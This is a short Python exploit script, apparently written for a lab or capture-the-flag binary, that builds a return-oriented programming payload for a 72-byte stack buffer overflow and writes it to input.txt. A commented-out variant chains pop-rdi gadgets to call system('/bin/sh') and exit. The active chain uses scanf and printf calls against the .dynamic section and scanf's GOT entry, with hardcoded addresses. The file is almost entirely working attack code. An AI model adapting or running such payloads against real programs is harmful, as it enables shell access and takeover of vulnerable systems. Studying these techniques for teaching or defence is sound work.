#!/usr/bin/env python
from struct import *
import sys

bufferSize = 72

"""
/bin/sh 		0x7ffff7b99d57
system			0x7ffff7a52390
exit 			0x7ffff7a47030
popRbpret 		0x555555554610
addEsp8Ret		0x555555554573
popRdiRet 		0x5555555546be

scanf@libc		0x000000000006b4d0
scanfCallOffset	0x00000000000005a0
scanf@main 		0x000055555555472f
.dynamic 		0x0000000000200df0

#rsi = buffer
#rdi = string format

binShCode = 0x7ffff7b99d57
systemCode = 0x7ffff7a52390
exitCode = 0x7ffff7a47030
popRbpRetCode = 0x555555554610
popRdiRetCode = 0x5555555546be
addEsp8Ret = 0x555555554573

buffer = ""
buffer += "A" * (bufferSize - 0)
buffer += pack("Q", popRdiRetCode) 
buffer += pack("Q", binShCode)
buffer += pack("Q", systemCode)
buffer += pack("Q", exitCode)

sys.stdout.write(buffer)
"""


"""
buffer += pack("Q", 0x55555555472f)		#scanf call
buffer += pack("Q", 0x5555555547c1) 	#pop pop ret
"""

buffer = ""
buffer += "A" * bufferSize

inputString = "%8a\n" + "\0"

scanfCall = 	0x55555555472f
printfCall = 	0x555555554717
popRdi = 		0x5555555546be
popRsiPopR15 = 	0x5555555547c0 
scanfGOT = 		0x000000201018
exitCode = 		0x7ffff7a47030
dynamic = 		0x000000200df0

buffer += pack("Q", popRdi)
buffer += pack("Q", dynamic)
buffer += pack("Q", scanfCall)

buffer += pack("Q", popRdi)
buffer += pack("Q", dynamic)
buffer += pack("Q", popRsiPopR15)
buffer += pack("Q", scanfGOT)
buffer += pack("Q", scanfGOT)
buffer += pack("Q", printfCall)
buffer += pack("Q", exitCode)

f = open("input.txt", "w")

f.write(buffer + " ")

f.write(inputString)